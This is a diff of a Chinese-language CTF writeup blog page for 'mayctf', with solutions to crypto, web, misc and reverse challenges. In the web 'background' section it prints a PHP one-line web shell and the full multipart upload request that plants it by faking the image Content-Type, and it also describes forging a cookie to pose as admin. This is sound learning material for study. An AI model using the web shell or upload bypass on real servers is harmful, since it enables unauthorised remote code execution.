@@ -4,20 +4,19 @@
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="robots" content="noodp" />
-        <title>mayctf writeup by Mio and K-ON! - JuicyMio&#39;s blog</title><meta name="Description" content="Plus Ultra"><meta property="og:title" content="mayctf writeup by Mio and K-ON!" />
-<meta property="og:description" content="侠客行 crypto easy_md5 计算服务器给出的乱码字符串的md5码, 虽然很简单但是那个乱码字符串用recvuntil读进来是bytes类型, 转字符串再计算md5" />
+        <title>mayctf writeup by Mio and K-ON! - JuicyMio&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="mayctf writeup by Mio and K-ON!" />
+<meta property="og:description" content="侠客行 crypto easy_md5计算服务器给出的乱码字符串的md5码, 虽然很简单但是那个乱码字符串用recvuntil读进来是bytes类型, 转字符" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://juicymio.github.io/mayctf_writeup/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-11-07T21:00:00+08:00" />
-<meta property="article:modified_time" content="2022-11-07T21:00:00+08:00" /><meta property="og:site_name" content="JuicyMio&#39;s Blog" />
+<meta property="article:modified_time" content="2022-11-07T21:00:00+08:00" />
 
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="mayctf writeup by Mio and K-ON!"/>
-<meta name="twitter:description" content="侠客行 crypto easy_md5 计算服务器给出的乱码字符串的md5码, 虽然很简单但是那个乱码字符串用recvuntil读进来是bytes类型, 转字符串再计算md5"/>
-<meta name="application-name" content="My cool site">
-<meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="mayctf writeup by Mio and K-ON!"/>
+<meta name="twitter:description" content="侠客行 crypto easy_md5计算服务器给出的乱码字符串的md5码, 虽然很简单但是那个乱码字符串用recvuntil读进来是bytes类型, 转字符"/>
+<meta name="application-name" content="JuicyMio&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="JuicyMio&#39;s blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://juicymio.github.io/mayctf_writeup/" /><link rel="prev" href="http://juicymio.github.io/tricks/" /><link rel="next" href="http://juicymio.github.io/oslearning/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://juicymio.github.io/mayctf_writeup/" /><link rel="prev" href="http://juicymio.github.io/tricks/" /><link rel="next" href="http://juicymio.github.io/oslearning/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
         <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
         <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
     {
@@ -28,7 +27,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http:\/\/juicymio.github.io\/mayctf_writeup\/"
-        },"genre": "posts","wordcount":  12641 ,
+        },"genre": "posts","wordcount":  12896 ,
         "url": "http:\/\/juicymio.github.io\/mayctf_writeup\/","datePublished": "2022-11-07T21:00:00+08:00","dateModified": "2022-11-07T21:00:00+08:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -37,7 +36,7 @@
             },"description": ""
     }
     </script></head>
-    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : '' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
 
         <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
     <div class="header-wrapper">
@@ -102,7 +101,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">mayctf writeup by Mio and K-ON!</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>JuicyMio</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-11-07">2022-11-07</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;12641 words&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-11-07">2022-11-07</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;12896 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;26 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="true">
                 <div class="details-summary toc-title">
@@ -190,10 +189,10 @@
     </li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><h1 id="侠客行">侠客行</h1>
-<h2 id="crypto">crypto</h2>
-<h3 id="easy_md5">easy_md5</h3>
-<p>计算服务器给出的乱码字符串的md5码, 虽然很简单但是那个乱码字符串用recvuntil读进来是bytes类型, 转字符串再计算md5的处理折磨了我几天, 最后用一种比较离谱的办法搞出来了.</p>
+            </div><div class="content" id="content"><h1 id="侠客行" class="headerLink">
+    <a href="#%e4%be%a0%e5%ae%a2%e8%a1%8c" class="header-mark"></a>侠客行</h1><h2 id="crypto" class="headerLink">
+    <a href="#crypto" class="header-mark"></a>crypto</h2><h3 id="easy_md5" class="headerLink">
+    <a href="#easy_md5" class="header-mark"></a>easy_md5</h3><p>计算服务器给出的乱码字符串的md5码, 虽然很简单但是那个乱码字符串用recvuntil读进来是bytes类型, 转字符串再计算md5的处理折磨了我几天, 最后用一种比较离谱的办法搞出来了.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -260,8 +259,8 @@
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="baby_rsa">baby_rsa</h3>
-<p>题目给了很多组用相同e=11加密的密文, 应该可以使用<a href="https://lcark.github.io/2019/11/09/RSA-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/" target="_blank" rel="noopener noreffer ">低加密指数广播攻击</a>, 这个链接里的CRT库我没搞到, 就搜了个中国剩余定理的代码自己加上去了. 网上搜一搜(可能要多搜一搜)就能找到类似的能用的脚本, 搜索关键词: ctf RSA 常见攻击方法.
+</div><h3 id="baby_rsa" class="headerLink">
+    <a href="#baby_rsa" class="header-mark"></a>baby_rsa</h3><p>题目给了很多组用相同e=11加密的密文, 应该可以使用<a href="https://lcark.github.io/2019/11/09/RSA-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/" target="_blank" rel="noopener noreffer ">低加密指数广播攻击</a>, 这个链接里的CRT库我没搞到, 就搜了个中国剩余定理的代码自己加上去了. 网上搜一搜(可能要多搜一搜)就能找到类似的能用的脚本, 搜索关键词: ctf RSA 常见攻击方法.
 (我其实根本不会什么RSA, 比赛期间每天开几百个标签页翻博客翻wiki现学)</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -563,8 +562,8 @@
 </span></span><span class="line"><span class="cl"><span class="c1">#https://lcark.github.io/2019/11/09/RSA-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="typing_game_revange-aka-baby_guess_me">typing_game_revange AKA baby_guess_me</h3>
-<p>读代码可知前666次是和baby_typing_game一样的, 只需要把服务器发送过来的随机数发送回去即可, 但666次之后将不再给出这个随机数. 那就需要我们猜出这个随机数是什么. 观察随机数生成的代码.</p>
+</div><h3 id="typing_game_revange-aka-baby_guess_me" class="headerLink">
+    <a href="#typing_game_revange-aka-baby_guess_me" class="header-mark"></a>typing_game_revange AKA baby_guess_me</h3><p>读代码可知前666次是和baby_typing_game一样的, 只需要把服务器发送过来的随机数发送回去即可, 但666次之后将不再给出这个随机数. 那就需要我们猜出这个随机数是什么. 观察随机数生成的代码.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1063,8 +1062,8 @@
 </span></span><span class="line"><span class="cl"><span class="c1"># 预测MT19937随机数</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="easy_rsa">easy_rsa</h3>
-<p>给了c, n, e, 且e十分巨大. 搜索ctf常见RSA攻击方法得知可以用维纳攻击. 但是网上搜的脚本大部分都不好用, 好像是因为数太大了处理不了? 最后找到一个github上7年前提交过7次的<a href="https://github.com/zongyuwu/WienerAttack" target="_blank" rel="noopener noreffer ">仓库</a>, 给出n和e可以维纳攻击出p, q</p>
+</div><h3 id="easy_rsa" class="headerLink">
+    <a href="#easy_rsa" class="header-mark"></a>easy_rsa</h3><p>给了c, n, e, 且e十分巨大. 搜索ctf常见RSA攻击方法得知可以用维纳攻击. 但是网上搜的脚本大部分都不好用, 好像是因为数太大了处理不了? 最后找到一个github上7年前提交过7次的<a href="https://github.com/zongyuwu/WienerAttack" target="_blank" rel="noopener noreffer ">仓库</a>, 给出n和e可以维纳攻击出p, q</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1157,9 +1156,9 @@
 </span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="web">web</h2>
-<h3 id="no-copy">NO COPY</h3>
-<p>直接显示flag但禁止复制, 但是这个功能肯定要js来实现所以直接把js关掉就行.</p>
+</div><h2 id="web" class="headerLink">
+    <a href="#web" class="header-mark"></a>web</h2><h3 id="no-copy" class="headerLink">
+    <a href="#no-copy" class="header-mark"></a>NO COPY</h3><p>直接显示flag但禁止复制, 但是这个功能肯定要js来实现所以直接把js关掉就行.</p>
 <ol>
 <li>chrome设置里就有.</li>
 <li>我因为经常复制网页上不让复制的东西比如百度文库, 所以有脚本: 建一个书签然后链接填下面的东西, 需要复制的时候点一下就行. 不过这个功能比较单一, 遇到高级点的防复制就不好使了, 油猴上还有别的更高级的脚本可以自行搜索.</li>
@@ -1175,8 +1174,8 @@
 </div><ol start="3">
 <li>你真的不知道有这么回事, 但js并不能阻止你从html代码里复制东西, 所以把html代码flag那段复制出来, 用ctrl + F把<code>&lt;/span&gt;&lt;span&gt;</code>全都删掉</li>
 </ol>
-<h3 id="typing-train">typing train</h3>
-<p>把网页上的字符串打到输入框里6666次, 我不会写脚本, 搜索了一下发现可以用python的selenium库. 自行搜索安装方法. 给chrome所在位置加环境变量会方便一些.</p>
+<h3 id="typing-train" class="headerLink">
+    <a href="#typing-train" class="header-mark"></a>typing train</h3><p>把网页上的字符串打到输入框里6666次, 我不会写脚本, 搜索了一下发现可以用python的selenium库. 自行搜索安装方法. 给chrome所在位置加环境变量会方便一些.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1209,12 +1208,12 @@
 </div>
 </div><p>注意CSDN搜到的带find_element_By_ID之类的函数在现版本全部被代码里的find_element函数取代了, 这还是在StackOverflow查到的, 简中局域网害人不浅(
 另外如果在函数里写driver.get, 函数结束之后浏览器会自动关闭, 你就白跑十几分钟了.</p>
-<h3 id="find_it">find_it</h3>
-<p><strong>十分鸡贼</strong>
+<h3 id="find_it" class="headerLink">
+    <a href="#find_it" class="header-mark"></a>find_it</h3><p><strong>十分鸡贼</strong>
 翻到&quot;哼, 你要找的东西就在这里&quot;那页, f12打开css翻到最下面, flag藏在那里.
 我找了几天没找到, 最后是因为上课没带鼠标, 用触摸板乱划发现css长度不对才找到的.</p>
-<h3 id="sheep">sheep</h3>
-<p><strong>十分鸡贼</strong>
+<h3 id="sheep" class="headerLink">
+    <a href="#sheep" class="header-mark"></a>sheep</h3><p><strong>十分鸡贼</strong>
 声称通关得flag, 于是我写了个通关脚本, 结果发现通关并不得flag. (而且, 脚本跑太快会卡出bug).
 但写了不能白写我还是把它放在下面. 把主函数里的注释取消就可以跑了,为了防止卡住需要手动最大化浏览器, 但这样太快了还是会卡住.</p>
 <div class="highlight"><div class="chroma">
@@ -1389,8 +1388,8 @@
 </div>
 </div><p>(其实我都看到通关进入http://124.220.41.254:20003/fl4g.php了, 但是我web知识不足, 看到hack brower以为是通关得权限).
 事实上看js可以直接发现通关进入fl4g.php, 进入后提示需要<strong>hack</strong> browser,于是进行各种搜索, 得知是需要伪造http请求头. 把User-Agent改成&quot;hack&quot;, 下一步提示改Cookie伪装成admin, chrome控制台打document.cookie, 得到我们原本的cookie是&quot;user=guest&quot;, 于是写&quot;Cookie&quot;: &ldquo;user=admin&rdquo;, 发送后得到下一步提示用POST而不是GET, 所以把POST改成GET得flag. 具体代码如上.</p>
-<h3 id="background">background</h3>
-<p>要求上传一个文件, 于是搜索一下&quot;PHP文件上传漏洞&quot;, 进行各种学习发现要传一个木马进去, 然后用工具连接服务器. 木马原理自行搜索(我不记得在哪看的了.
+<h3 id="background" class="headerLink">
+    <a href="#background" class="header-mark"></a>background</h3><p>要求上传一个文件, 于是搜索一下&quot;PHP文件上传漏洞&quot;, 进行各种学习发现要传一个木马进去, 然后用工具连接服务器. 木马原理自行搜索(我不记得在哪看的了.
 随便试试发现最经典的eval被禁了, assert在PHP7已经不能执行函数了,
 发送一句话木马<code>&lt;?php $st=@create_function('',$_POST['a']);$st();?&gt;</code>
 先随便发点什么上去, brupsuite抓包之后修改Content-Type: image/jpeg, 内容改为一句话木马, 文件后缀改成.php再发送(在repeater那里改), 否则会被拦住, 提示&quot;哎呦~你干嘛&quot;.
@@ -1426,48 +1425,48 @@
 </span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /1.php HTTP/1.1
-</span></span><span class="line"><span class="cl">Host: 49.234.84.189:2543
-</span></span><span class="line"><span class="cl">Content-Length: 339
-</span></span><span class="line"><span class="cl">Cache-Control: max-age=0
-</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
-</span></span><span class="line"><span class="cl">Origin: http://49.234.84.189:2543
-</span></span><span class="line"><span class="cl">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5yBJNBeG49JfxFwN
-</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.91 Safari/537.36
-</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-</span></span><span class="line"><span class="cl">Referer: http://49.234.84.189:2543/
-</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
-</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.9
-</span></span><span class="line"><span class="cl">Connection: close
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">POST</span> <span class="o">/</span><span class="mf">1.</span><span class="n">php</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="p">:</span> <span class="mf">49.234</span><span class="o">.</span><span class="mf">84.189</span><span class="p">:</span><span class="mi">2543</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">339</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cache</span><span class="o">-</span><span class="ne">Control</span><span class="p">:</span> <span class="nb">max</span><span class="o">-</span><span class="n">age</span><span class="o">=</span><span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Origin</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">49.234</span><span class="o">.</span><span class="mf">84.189</span><span class="p">:</span><span class="mi">2543</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">multipart</span><span class="o">/</span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">boundary</span><span class="o">=----</span><span class="n">WebKitFormBoundary5yBJNBeG49JfxFwN</span>
+</span></span><span class="line"><span class="cl"><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">Windows</span> <span class="n">NT</span> <span class="mf">10.0</span><span class="p">;</span> <span class="n">Win64</span><span class="p">;</span> <span class="n">x64</span><span class="p">)</span> <span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="n">KHTML</span><span class="p">,</span> <span class="n">like</span> <span class="n">Gecko</span><span class="p">)</span> <span class="n">Chrome</span><span class="o">/</span><span class="mf">106.0</span><span class="o">.</span><span class="mf">5249.91</span> <span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">avif</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">webp</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">apng</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">signed</span><span class="o">-</span><span class="n">exchange</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="n">b3</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span>
+</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">49.234</span><span class="o">.</span><span class="mf">84.189</span><span class="p">:</span><span class="mi">2543</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span> <span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">------WebKitFormBoundary5yBJNBeG49JfxFwN
-</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;uploaded&#34;; filename=&#34;Mio_2.php&#34;
-</span></span><span class="line"><span class="cl">Content-Type: image/jpeg
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundary5yBJNBeG49JfxFwN</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;uploaded&#34;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&#34;Mio_2.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">image</span><span class="o">/</span><span class="n">jpeg</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">&lt;?php $st=@create_function(&#39;&#39;,$_POST[&#39;a&#39;]);$st();?&gt;
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="o">$</span><span class="n">st</span><span class="o">=</span><span class="err">@</span><span class="n">create_function</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]);</span><span class="o">$</span><span class="n">st</span><span class="p">();</span><span class="err">?</span><span class="o">&gt;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">------WebKitFormBoundary5yBJNBeG49JfxFwN
-</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;Upload&#34;
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundary5yBJNBeG49JfxFwN</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;Upload&#34;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">涓婁紶
-</span></span><span class="line"><span class="cl">------WebKitFormBoundary5yBJNBeG49JfxFwN--
+</span></span><span class="line"><span class="cl"><span class="err">涓婁紶</span>
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundary5yBJNBeG49JfxFwN</span><span class="o">--</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="misc">misc</h2>
-<h3 id="sign_in">sign_in</h3>
-<p>flag在频道里</p>
-<h3 id="rack-your-brain">rack your brain</h3>
-<p>一眼佛曰, 解码之后是一眼brainfuck, 再解码就是flag</p>
-<h3 id="thin_dog">thin_dog</h3>
-<p>打开视频一听发现左边有细狗之外的声音, 用potplayer把右声道关掉仔细听左边.
+</div><h2 id="misc" class="headerLink">
+    <a href="#misc" class="header-mark"></a>misc</h2><h3 id="sign_in" class="headerLink">
+    <a href="#sign_in" class="header-mark"></a>sign_in</h3><p>flag在频道里</p>
+<h3 id="rack-your-brain" class="headerLink">
+    <a href="#rack-your-brain" class="header-mark"></a>rack your brain</h3><p>一眼佛曰, 解码之后是一眼brainfuck, 再解码就是flag</p>
+<h3 id="thin_dog" class="headerLink">
+    <a href="#thin_dog" class="header-mark"></a>thin_dog</h3><p>打开视频一听发现左边有细狗之外的声音, 用potplayer把右声道关掉仔细听左边.
 是一堆单词, 如果知道这种无线电中用单词表示字母的方式那一下子就能听出来, 不知道的话可能要进行一些搜索.
 <a href="https://www.worldometers.info/languages/nato-phonetic-alphabet/" target="_blank" rel="noopener noreffer ">nato phonetic alphabet</a></p>
-<h3 id="小紫">小紫</h3>
-<p>第一个压缩包里是个png, 略加检查分离不出来什么. 010hex打开发现长度不对, 改长一些能看见下面隐藏的第二个压缩包密码.
+<h3 id="小紫" class="headerLink">
+    <a href="#%e5%b0%8f%e7%b4%ab" class="header-mark"></a>小紫</h3><p>第一个压缩包里是个png, 略加检查分离不出来什么. 010hex打开发现长度不对, 改长一些能看见下面隐藏的第二个压缩包密码.
 第二个压缩包打开是个bmp, 也分离不出什么, hint图提示我们长度仍有问题, 根据bitcount计算长度应该是0x754(原来是0x744), 用010hex修改即可. 注意bmp长度必须精确修改, 否则打不开.
 改完之后flag藏在右上角(我一开始就没看见).</p>
-<h3 id="wingman">wingman</h3>
-<p>社工题. 打开图仔细看图片后面蓝色的universal studio广告, 下面五个字母应该是Japan. 题目提示her major in law, 求暂住地. 可以想到是日本环球影城附近的大学. 尝试大阪大学即可达到经纬度的精度要求. (一开始没注意暂住地, 看路牌试了全世界的各种地方.) 以下为尝试记录和exp(然而是出题人提供的)</p>
+<h3 id="wingman" class="headerLink">
+    <a href="#wingman" class="header-mark"></a>wingman</h3><p>社工题. 打开图仔细看图片后面蓝色的universal studio广告, 下面五个字母应该是Japan. 题目提示her major in law, 求暂住地. 可以想到是日本环球影城附近的大学. 尝试大阪大学即可达到经纬度的精度要求. (一开始没注意暂住地, 看路牌试了全世界的各种地方.) 以下为尝试记录和exp(然而是出题人提供的)</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1668,8 +1667,8 @@
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="baby_typing_game">baby_typing_game</h3>
-<p>就是服务器发什么抄一遍发回去重复999次就行, 字符串处理看下面代码. 前面的sha验证仍然抄出题人给的wingman的hint脚本</p>
+</div><h3 id="baby_typing_game" class="headerLink">
+    <a href="#baby_typing_game" class="header-mark"></a>baby_typing_game</h3><p>就是服务器发什么抄一遍发回去重复999次就行, 字符串处理看下面代码. 前面的sha验证仍然抄出题人给的wingman的hint脚本</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1832,8 +1831,8 @@
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="secsome_cfg">secsome_cfg</h3>
-<p>hint: CFG stands for what? cfg代表了什么?
+</div><h3 id="secsome_cfg" class="headerLink">
+    <a href="#secsome_cfg" class="header-mark"></a>secsome_cfg</h3><p>hint: CFG stands for what? cfg代表了什么?
 我一开始以为是.cfg后缀的文件, 全称是config. 然后又看代码的main函数巨大, 以为是要把ida的.cfg文件改了, 增大可反编译函数的大小限制. 经过各种改大之后电脑五次爆内存, 搞不出.
 后来发现cfg的另一种解释, Control Flow Graph. 控制流程图, 就是ida生成的那个流程图. 然而发现函数太大了, nodes限制只有1000个, 所以把限制调大, 这个只需要在IDA里面改.
 在IDA里点option-general-Max number of nodes: 100000
@@ -1856,8 +1855,8 @@
         title="ID-2-T2-U-S-FO6-QNSZTFXF-H.png" /></a>
 <code>MAYCTF{$(AUTHOR)_S3creT_C0nTroL_Flow_GraPh}</code>
 最后一步是把$(AUTHOR)换成出题人的网名secsome</p>
-<h3 id="shape_secret">shape_secret</h3>
-<p>阅读Description发现要进行一个手动图形渲染, 一帧帧绘制.
+<h3 id="shape_secret" class="headerLink">
+    <a href="#shape_secret" class="header-mark"></a>shape_secret</h3><p>阅读Description发现要进行一个手动图形渲染, 一帧帧绘制.
 看secret.shp文件脑跑一下读文件头过程可以猜出数据是小端序的, 不然宽和高太大了, 后面的Frame Header也对不上.(这点也可以用offset的值来验证, 大端序offset也对不上)
 先读一个文件头, 得到高和宽. 然后按顺序读每帧的文件头, 这里主要是height, width和flag, offset没什么大用, 因为所有数据都是按顺序而且连着的, 不过可以用来检查自己数据读入是否错误, color没给调色板, 直接全用一个颜色, align和reserved完全没用.
 flag直接抄一下题里给的那个代码就行, 是用来区分压缩的数据和非压缩的数据的.
@@ -2148,9 +2147,9 @@ flag直接抄一下题里给的那个代码就行, 是用来区分压缩的数�
 </div>
 </div><p>把脚本和shape_secret.shp放在同一目录下运行, 会在该目录下生成pic文件夹, 里面按顺序存放了40帧图片, 画着flag的一个个字符(出题人说用鼠标画的). 注意那个看起来像θ的东西是0.
 (仔细阅读Description会发现有个Westwood, 也就是红警的西木公司. 当时注意到了但是没搜到什么东西, 赛后得知有新大陆).</p>
-<h2 id="reverse">reverse</h2>
-<h3 id="hello_net">hello_net</h3>
-<p>直接用ILSPY打开就能看见flag, 好像甚至用记事本都行.
+<h2 id="reverse" class="headerLink">
+    <a href="#reverse" class="header-mark"></a>reverse</h2><h3 id="hello_net" class="headerLink">
+    <a href="#hello_net" class="header-mark"></a>hello_net</h3><p>直接用ILSPY打开就能看见flag, 好像甚至用记事本都行.
